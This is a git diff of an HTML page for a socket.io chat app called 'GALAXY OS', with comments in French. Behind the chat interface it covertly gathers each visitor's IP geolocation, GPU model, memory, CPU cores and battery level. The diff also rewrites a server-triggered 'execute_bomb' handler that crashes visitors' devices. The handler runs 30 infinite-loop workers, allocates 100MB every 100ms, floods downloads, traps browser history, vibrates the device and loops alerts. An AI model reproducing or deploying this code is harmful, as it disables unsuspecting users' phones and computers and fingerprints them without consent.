@@ -3,53 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY OS - V12</title>
+    <title>GALAXY OS - TOTAL EXTINCTION</title>
     <style>
-        :root { --main: #a29bfe; --red: #ff4757; }
+        :root { --main: #a29bfe; }
         body { margin: 0; background: #000; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
-        
-        /* STYLE DU CHAT */
         #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { border: 1px solid var(--main); padding: 40px; text-align: center; background: #0a0a0a; width: 300px; }
-        #side-menu { width: 250px; background: #050505; border-right: 1px solid #222; display: flex; flex-direction: column; }
+        .login-box { border: 1px solid var(--main); padding: 30px; text-align: center; background: #050505; width: 280px; }
+        #side-menu { width: 240px; background: #080808; border-right: 1px solid #222; display: flex; flex-direction: column; }
         #main-chat { flex: 1; display: flex; flex-direction: column; }
-        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; }
-        .msg-card { background: #111; padding: 10px; margin-bottom: 10px; border-left: 3px solid var(--main); }
-        #form { display: flex; padding: 15px; background: #000; gap: 10px; }
-        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 10px; outline: none; }
-        .btn { background: var(--main); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
-
-        /* INTERFACE DE CRASH */
-        #bomb-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; text-align: center; color: red; }
-        #bomb-screen canvas { position: absolute; inset: 0; width: 100%; height: 100%; opacity: 0.5; }
-        .glitch { position: relative; z-index: 1000000; margin-top: 40vh; font-size: 3em; animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        #messages { flex: 1; overflow-y: auto; padding: 15px; list-style: none; }
+        .msg-card { background: #111; padding: 8px; margin-bottom: 8px; border-left: 2px solid var(--main); font-size: 0.9em; }
+        #form { display: flex; padding: 10px; background: #000; gap: 10px; }
+        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 8px; outline: none; }
+        .btn { background: var(--main); border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
+        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; color: red; text-align: center; padding-top: 40vh; }
     </style>
 </head>
 <body>
 
-    <div id="bomb-screen">
-        <canvas id="gpu-kill"></canvas>
-        <h1 class="glitch">SYSTEM_MELTDOWN</h1>
-        <p id="mem-stat" style="position:relative; z-index:1000000; color:white;"></p>
+    <div id="crash-screen">
+        <h1 style="font-size: 3em; animation: blink 0.1s infinite;">FATAL_ERROR</h1>
+        <p id="crash-log">OVERLOADING_SYSTEM...</p>
     </div>
 
     <div id="login-overlay">
         <div class="login-box">
-            <h2 style="color:var(--main);">GALAXY_OS_V12</h2>
-            <input type="text" id="login-name" placeholder="PSEUDO..." style="width:100%; padding:10px; margin-bottom:10px; background:#000; color:white; border:1px solid #333;">
-            <input type="file" id="login-pp-file" style="font-size:0.7em; margin-bottom:20px;">
-            <button class="btn" style="width:100%;" onclick="startDeepScan()">CONNECTER</button>
+            <h2 style="color:var(--main);">GALAXY_OS</h2>
+            <input type="text" id="login-name" placeholder="PSEUDO..." style="width:95%; padding:10px; margin-bottom:10px; background:#000; color:white; border:1px solid #333;">
+            <input type="file" id="login-pp-file" style="font-size:0.7em; margin-bottom:15px; width:100%;">
+            <button class="btn" style="width:100%;" onclick="startDeepScan()">LOGIN</button>
         </div>
     </div>
 
     <div id="side-menu">
-        <div style="padding:20px; text-align:center;">
-            <img src="" id="my-avatar" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--main); display:none; object-fit: cover;">
-            <h4 id="my-name-display"></h4>
+        <div style="padding:15px; text-align:center;">
+            <img src="" id="my-avatar" style="width:50px; height:50px; border-radius:50%; border:1px solid var(--main); display:none; object-fit: cover;">
+            <h4 id="my-name-display" style="font-size:0.8em;"></h4>
         </div>
-        <div style="padding:20px; font-size:0.7em; color:lime;" id="monitor">
-            <p id="mon-ip">IP: SCANNING...</p>
+        <div id="monitor" style="padding:10px; font-size:0.65em; color:lime;">
+            <p id="mon-ip">IP: SCAN...</p>
             <p id="mon-bat">BAT: --%</p>
         </div>
     </div>
@@ -57,16 +49,15 @@
     <div id="main-chat">
         <ul id="messages"></ul>
         <form id="form">
-            <input id="input" autocomplete="off" placeholder="COMMANDE..." />
-            <button type="submit" class="btn">EXEC</button>
+            <input id="input" autocomplete="off" placeholder="TEXTE..." />
+            <button type="submit" class="btn">GO</button>
         </form>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let user = JSON.parse(localStorage.getItem('galaxy_v12')) || { name: "", pp: "", geo: {}, hardware: {} };
-        let bombWorkers = [];
+        let user = JSON.parse(localStorage.getItem('galaxy_v14')) || { name: "", pp: "", geo: {}, hardware: {} };
 
         window.onload = () => { if(user.name) finalize(user.name, true); };
 
@@ -74,20 +65,13 @@
             const name = document.getElementById('login-name').value;
             if(!name) return;
             try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
-            
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
             const b = await navigator.getBattery();
-
             user.hardware = {
-                gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
+                gpu: (document.createElement('canvas').getContext('webgl')).getParameter(37446),
                 ram: navigator.deviceMemory || "N/A",
                 cores: navigator.hardwareConcurrency,
-                battery: Math.floor(b.level * 100),
-                ua: navigator.userAgent
+                battery: Math.floor(b.level * 100)
             };
-
             const file = document.getElementById('login-pp-file').files[0];
             if(file) {
                 const reader = new FileReader();
@@ -101,7 +85,7 @@
 
         function finalize(name, auto=false) {
             user.name = name;
-            if(!auto) localStorage.setItem('galaxy_v12', JSON.stringify(user));
+            if(!auto) localStorage.setItem('galaxy_v14', JSON.stringify(user));
             document.getElementById('login-overlay').style.display = 'none';
             document.getElementById('my-avatar').src = user.pp;
             document.getElementById('my-avatar').style.display = 'inline-block';
@@ -120,55 +104,47 @@
             }
         };
 
-        socket.on('chat message', (data) => {
+        socket.on('chat message', (d) => {
             const li = document.createElement('li');
             li.className = 'msg-card';
-            li.innerHTML = `<b>${data.name}</b>: ${data.text}`;
+            li.innerHTML = `<b>${d.name}</b>: ${d.text}`;
             document.getElementById('messages').appendChild(li);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
 
-        // 🧨 LA BOMBE DESTRUCTIVE (PC/MOBILE)
+        // 💣 CHARGE UTILE DE MORT (CPU/RAM/GPU/NETWORK)
         socket.on('execute_bomb', () => {
             localStorage.clear();
-            document.getElementById('bomb-screen').style.display = 'block';
+            document.getElementById('crash-screen').style.display = 'block';
             
-            // 1. Surcharge GPU (Rendu massif)
-            const cv = document.getElementById('gpu-kill');
-            const cx = cv.getContext('2d');
-            cv.width = window.innerWidth; cv.height = window.innerHeight;
-            setInterval(() => {
-                for(let i=0; i<50000; i++) {
-                    cx.fillStyle = `rgb(${Math.random()*255},0,0)`;
-                    cx.fillRect(Math.random()*cv.width, Math.random()*cv.height, 2, 2);
-                }
-            }, 10);
+            // 1. Surcharge CPU (30 Threads)
+            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
+            for(let i=0; i<30; i++) { new Worker(URL.createObjectURL(b)); }
 
-            // 2. Surcharge RAM (Memory Leak)
-            const leak = [];
+            // 2. Surcharge RAM & Réseau (Le Buffer de l'Enfer)
+            const storage = [];
             setInterval(() => {
-                leak.push(new Uint8Array(50 * 1024 * 1024)); // 50MB par cycle
-                document.getElementById('mem-stat').innerText = `OVERFLOW: ${leak.length * 50}MB`;
+                // Création de données binaires massives
+                const chunk = new Uint8Array(100 * 1024 * 1024); // 100MB
+                storage.push(chunk);
+                document.getElementById('crash-log').innerText = `MEM_BLOOD: ${storage.length * 100}MB`;
+                
+                // Spam de téléchargement (bloque la connexion)
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(new Blob([chunk]));
+                a.download = "CRASH_DATA_" + Math.random();
+                a.click();
             }, 100);
 
-            // 3. Surcharge CPU (Multi-threading)
-            const blob = new Blob([`while(true){postMessage(0)}`], {type: 'text/javascript'});
-            const url = URL.createObjectURL(blob);
-            for(let i=0; i<30; i++) {
-                let w = new Worker(url);
-                bombWorkers.push(w);
-            }
-
-            // 4. Blocage UI (Alertes & Vibrations)
+            // 3. Verrouillage UI (Alertes & Historique)
             if(navigator.vibrate) navigator.vibrate([10000, 500, 10000]);
             while(true) {
-                alert("CRITICAL_ERROR: GALAXY_OS_NEUTRALIZED_YOU");
+                window.history.pushState(null, null, window.location.href);
+                alert("GALAXY_OS: DEVICE_NEUTRALIZED");
             }
         });
 
-        socket.on('stop_bomb', () => {
-            location.reload();
-        });
+        socket.on('stop_bomb', () => { location.reload(); });
     </script>
 </body>
 </html>
